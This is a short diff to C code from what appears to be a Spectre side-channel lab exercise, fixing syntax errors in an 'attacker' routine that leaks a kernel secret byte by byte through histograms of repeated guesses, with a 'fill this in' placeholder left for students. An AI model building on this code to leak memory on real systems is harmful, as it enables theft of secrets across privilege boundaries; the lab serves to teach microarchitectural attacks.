@@ -62,7 +62,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
     printf("Launching attacker\n");
 
     for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
-        hist[256] = {0};
+        int hist[256] = {0};
         for (int i = 0; i < 30; i++)
         {
             char leaked_byte;
@@ -83,13 +83,13 @@ int run_attacker(int kernel_fd, char *shared_memory) {
                     leaked_byte = i;
                 }
             }
-            hist{leaked_byte}++;
+            hist[leaked_byte]++;
         }
         // [Part 2]- Fill this in!
         // leaked_byte = ??
 
-        leaked_str[current_offset] = max_idx(hist);
-        if (max_idx(hist) == 0) {//'\0'
+        leaked_str[current_offset] = max_idx(hist, 256);
+        if (max_idx(hist , 256) == 0) {//'\0'
             break;
         }
     }
